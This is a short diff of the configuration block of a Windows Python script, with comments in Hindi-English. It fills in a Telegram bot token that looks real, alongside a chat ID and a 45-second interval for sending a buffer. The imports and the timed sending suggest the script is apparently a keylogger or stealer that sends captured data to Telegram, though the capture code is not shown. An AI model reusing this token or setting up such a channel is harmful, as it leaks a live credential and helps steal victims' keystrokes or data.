@@ -9,7 +9,7 @@ import win32process
 import psutil
 
 # ============= CONFIG =============
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"   # ← Yahan apna bot token daal
+TELEGRAM_BOT_TOKEN = "8303464927:AAGq6lwHcTsYYOAbDUFkH9YTfHUzFAaq2dU"   # ← Yahan apna bot token daal
 TELEGRAM_CHAT_ID = "-1004320842899"           # ← Yahan apna chat id (hyphen ke saath)
 SEND_INTERVAL = 45                            # seconds mein buffer bhejega (45 recommended)
 # =================================
